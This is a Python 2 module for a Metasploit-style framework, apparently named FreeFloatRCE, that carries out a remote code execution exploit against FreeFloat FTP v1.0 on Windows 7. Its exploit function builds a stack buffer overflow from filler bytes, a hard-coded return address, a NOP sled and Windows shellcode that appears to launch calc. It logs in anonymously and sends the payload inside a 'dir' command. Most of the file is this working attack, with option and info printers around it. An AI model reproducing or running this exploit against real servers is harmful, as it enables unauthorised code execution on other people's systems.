import os, socket, time

def byte_pbyte(data):
	# check if there are multiple bytes
	if len(str(data)) > 1:
		# make list all bytes given
		msg = list(data)
		# mark which item is being converted
		s = 0
		for u in msg:
			# convert byte to ascii, then encode ascii to get byte number
			u = str(u).encode("hex")
			# make byte printable by canceling \x
			u = "\\x"+u
			# apply coverted byte to byte list
			msg[s] = u
			s = s + 1
		msg = "".join(msg)
	else:
		msg = data
		# convert byte to ascii, then encode ascii to get byte number
		msg = str(msg).encode("hex")
		# make byte printable by canceling \x
		msg = "\\x"+msg
	# return printable byte
	return msg

def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (%s)\n" %name
	print "  ID       Device"
	print "  --       ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("FreeFloatRCE","Normal","FreeFloat FTP Remote Code Execution")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print "\nPublisher Information for %s" %name
	print
	print "       Name:",name
	print "     Module:",module
	print "   Platform:",plat
	print " Privileged:",priv
	print "    License:",lic
	print "       Rank:",rank
	print "  Disclosed:",release
	print "         By:",by

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

try: RHOST
except: pass
try: RPORT
except: RPORT = 1
try: TIMEOUT
except: TIMEOUT = 10

def exploit(ip,port=21,TIMEOUT=10):
	print
	print "[*] Making Payload"
	overflow = 'A' * 247
	eip =  '\xF4\xAF\xEA\x75' + '\x90' * 10
	shellcode = (
	"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
	"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
	"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
	"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
	"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
	"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
	"\x45\x81\x3e\x43\x72\x65\x61\x75" +
	"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
	"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
	"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
	"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
	"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
	"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
	"\x53\x53\x53\x53\x52\x53\xff\xd7")
	remotecode = overflow + eip + shellcode + '\r\n'
	print "[*] Payload Finished"
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	socket.setdefaulttimeout(TIMEOUT)
	print "[*] Connecting To",RHOST
	s.connect((ip ,port))
	print "[*] Connected"
	print s.recv(1024)
	print "[*] Sending Username"
	s.send('USER anonymous')
	print s.recv(1024)
	print "[*] Sending Password"
	s.send('PASSW hacker@hacker.net')
	print s.recv(1024)
	print "[*] Confirmed"
	message = 'dir' + remotecode
	s.send(message)
	print "[*] Payload Sent"
	print byte_pbyte(s.recv(1024))
	print "[*] Execution Successful"
	s.close()
	print

def show_opt():
	print "\nModule Options (FreeFloatRCE)\n"
	print "  Name     Current Setting  Required  Description"
	print "  ----     ---------------  --------  -----------"
	try:
		auto_opt("RHOST",RHOST,"yes", "Target Host")
	except:
		auto_opt("RHOST","   ","yes", "Target Host")
	try:
		auto_opt("RPORT",str(RPORT),"yes", "Target Port")
	except:
		auto_opt("RPORT","   ","yes", "Target Port")
	try:
		auto_opt("TIMEOUT", str(TIMEOUT),"no", "Timeout Time")
	except:
		auto_opt("TIMEOUT","   ","no", "Timelout Time")
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			if RHOST and RPORT and TIMEOUT:
				exploit(RHOST,int(RPORT),int(TIMEOUT))
			else:
				print "Options Unset"
				show_opt()
		except Exception as e:
			print "Error:",str(e).upper()
			print
			time.sleep(0.3)
except:
	pass

try:
	if desc == "get-info":
		auto_info(name,"payloads/FreeFloatRCE","Python 2.7","No","N/A","Normal","2/11/16","Greg Priest")
		show_opt()
		targets = {"1":"Windows7 x64 HUN/ENG Professional","2":"FreeFloat FTP v1.0"}
		auto_targ(targets)
except:
	pass